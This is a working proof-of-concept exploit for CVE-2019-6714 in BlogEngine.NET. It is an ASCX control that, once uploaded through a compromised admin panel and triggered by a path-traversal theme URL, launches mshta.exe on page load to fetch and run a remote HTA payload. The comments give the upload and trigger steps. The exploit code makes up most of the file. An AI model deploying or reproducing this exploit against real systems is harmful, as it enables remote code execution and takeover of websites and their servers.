/*
 * Modified PoC of CVE-2019-6714 discovered by Cobb (2019).
 * By A. S. "Aleksey" Ahmann <hackermaneia@riseup.net>
 * - GitHub: https://github.com/Alekseyyy
 * - Keybase: https://keybase.io/epsiloncalculus
 *
 * This exploit works by first gaining access to the admin panel of
 * a BlogEngine.NET powered website. Then this file must be uploaded
 * onto the CMS as "PostView.ascx" and finally triggered by accessing
 * the following url:
 *    http://<target ip>/?theme=../../App_Data/files
 *
 * BUT BEFORE launching the exploit, be sure to configure the payload
 * below by setting the url that leads to the HTA payload.
 */

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
        System.Diagnostics.Process payload = new System.Diagnostics.Process();
        payload.StartInfo.FileName = "mshta.exe";
        payload.StartInfo.Arguments = ""; // url to HTA with payload
        payload.StartInfo.UseShellExecute = true;
        payload.StartInfo.CreateNoWindow = true;
        payload.Start();
    }
    
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>

/*
 * References
 * Cobb, D. (2019). BlogEngine.NET <= 3.3.6 Directory Traversal RCE. Exploit Database. Retrieved on Apr. 25, 2022 from: https://www.exploit-db.com/exploits/46353
 *
 */
